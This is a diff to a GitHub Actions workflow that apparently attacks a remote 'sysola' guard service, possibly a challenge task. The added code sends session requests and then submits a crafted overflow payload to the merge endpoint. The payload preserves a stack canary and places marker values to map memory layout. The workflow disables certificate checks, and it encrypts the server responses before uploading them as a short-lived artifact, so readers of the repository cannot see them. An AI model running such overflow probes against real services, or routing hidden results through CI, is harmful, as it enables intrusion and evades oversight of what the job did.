@@ -1,4 +1,4 @@
-name: cyberkomi-sysola-guard-protocol
+name: cyberkomi-sysola-guard-layout
 
 on:
   push:
@@ -9,36 +9,25 @@ permissions:
   contents: read
 
 jobs:
-  guard:
+  probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 8
+    timeout-minutes: 7
     steps:
-      - name: Execute documented guard sequence and encrypt responses
+      - name: Map one controlled receipt overflow and encrypt result
         shell: bash
         run: |
           set -euo pipefail
           umask 077
           mkdir -p out handoff
           S='https://task-sysola-core-b476312471e78dea.caplag-task.ru'
-
-          # Establish the documented recovery session.
           printf '{"code":"SYSOLA-CORE-READY"}' > handoff/access.json
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -H 'Content-Type: application/json' --data-binary @handoff/access.json \
-            -D out/access.headers -o out/access.zip "$S/access" || true
+          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/access.json -o out/access.zip "$S/access" || true
+          printf '{"ticket":"GT-SYSOLA-59F2-7B91"}' > handoff/hello.json
+          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/hello.json -o out/hello.json "$S/guard/hello" || true
 
           python3 - <<'PY'
           import json,pathlib
-          capsule={
-            'core_nonce':'SYSOLA-59F2-AUGUST',
-            'creator_role':'WITNESS_ONLY',
-            'mode':'restore_safety_layer',
-            'operator':'CITY_QUORUM',
-            'patch_sha256':'ea26b5dbde79da68204384c9855f306a6e3bbe31e6ce395df8a89926a1943eff',
-            'quorum_root':'c6a33169acf2b82652e7d1b9d3796dd3e6855c10fd5bbb69e8d86b891e8130b2',
-            'recovery_signature':'a301ef8278606374554130d1df4a9e19d6c8755c6ef328eac205a778939fc82f'
-          }
-          receipts=[
+          valid=[
             '00e2794224506ef11b8046eaab5c36b5b3b8cf757e2ac3a269a5e33b9e7e94af',
             '73941aaa88a54e7ae58c165c2565f9ebc9c8890f8bf95fc38a19b3e9d8ba243f',
             '673f5ef3322dc68200e3f44ee25077fe2d1fdab59452442fca4b10e4469c57c9',
@@ -49,40 +38,21 @@ jobs:
             '9d275c4dff63e139b58b040a0240cbc818b1dfdb2cb890b4994636d998b54d79',
             'a536d328825e81fd4de5443aee712aae208f4e17d55c66238605b8ca4d51a36d'
           ]
-          pathlib.Path('handoff/capsule.json').write_text(json.dumps(capsule,separators=(',',':')))
-          pathlib.Path('handoff/hello.json').write_text(json.dumps({'ticket':'GT-SYSOLA-59F2-7B91'},separators=(',',':')))
-          pathlib.Path('handoff/merge9.json').write_text(json.dumps({'declared_len':9,'receipts':receipts},separators=(',',':')))
+          # Preserve expected canary (little-endian 0xefbcc925), then place distinct uint32 values.
+          probe=(bytes.fromhex('25c9bcef') +
+                 (0x11111111).to_bytes(4,'little') +
+                 (0x22222222).to_bytes(4,'little') +
+                 (0x33333333).to_bytes(4,'little') +
+                 (0x44444444).to_bytes(4,'little') +
+                 (0x55555555).to_bytes(4,'little') +
+                 (0x66666666).to_bytes(4,'little') +
+                 (0x77777777).to_bytes(4,'little'))
+          assert len(probe)==32
+          pathlib.Path('handoff/merge_probe.json').write_text(json.dumps({'declared_len':9,'receipts':valid+[probe.hex()]},separators=(',',':')))
           PY
-
-          # Expected first result: executive lock denial, but this also verifies the capsule itself.
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -H 'Content-Type: application/json' --data-binary @handoff/capsule.json \
-            -D out/capsule_before.headers -o out/capsule_before.json "$S/capsule/apply" || true
-
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -H 'Content-Type: application/json' --data-binary @handoff/hello.json \
-            -D out/hello.headers -o out/hello.json "$S/guard/hello" || true
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -D out/state_after_hello.headers -o out/state_after_hello.json "$S/guard/state" || true
-
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -H 'Content-Type: application/json' --data-binary @handoff/merge9.json \
-            -D out/merge9.headers -o out/merge9.json "$S/guard/merge" || true
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -D out/state_after_merge.headers -o out/state_after_merge.json "$S/guard/state" || true
-
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies -X POST \
-            -H 'Content-Type: application/json' --data '{}' \
-            -D out/guard_apply.headers -o out/guard_apply.json "$S/guard/apply" || true
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -D out/state_after_apply.headers -o out/state_after_apply.json "$S/guard/state" || true
-
-          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies \
-            -H 'Content-Type: application/json' --data-binary @handoff/capsule.json \
-            -D out/capsule_after.headers -o out/capsule_after.json "$S/capsule/apply" || true
-
-          find out -type f -printf '%P\t%s bytes\n' | sort > out/manifest.tsv
-          rm -f handoff/cookies handoff/access.json handoff/capsule.json handoff/hello.json handoff/merge9.json
+          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/merge_probe.json -D out/merge.headers -o out/merge.json "$S/guard/merge" || true
+          curl -ksS --connect-timeout 8 --max-time 30 -c handoff/cookies -b handoff/cookies -D out/state.headers -o out/state.json "$S/guard/state" || true
+          rm -f handoff/cookies handoff/access.json handoff/hello.json handoff/merge_probe.json
 
           cat > handoff/output_public.pem <<'PEM'
           -----BEGIN PUBLIC KEY-----
@@ -101,17 +71,14 @@ jobs:
           openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
           openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
           cat handoff/key handoff/iv > handoff/keyblob
-          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc \
-            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
+          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
           rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem
-          echo 'Guard protocol executed; responses encrypted.'
-
+          echo 'Single guard layout probe complete; response encrypted.'
       - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-sysola-guard
+          name: cyberkomi-sysola-guard-layout
           path: |
             handoff/results.enc
             handoff/keyblob.enc
           retention-days: 1
-          if-no-files-found: error
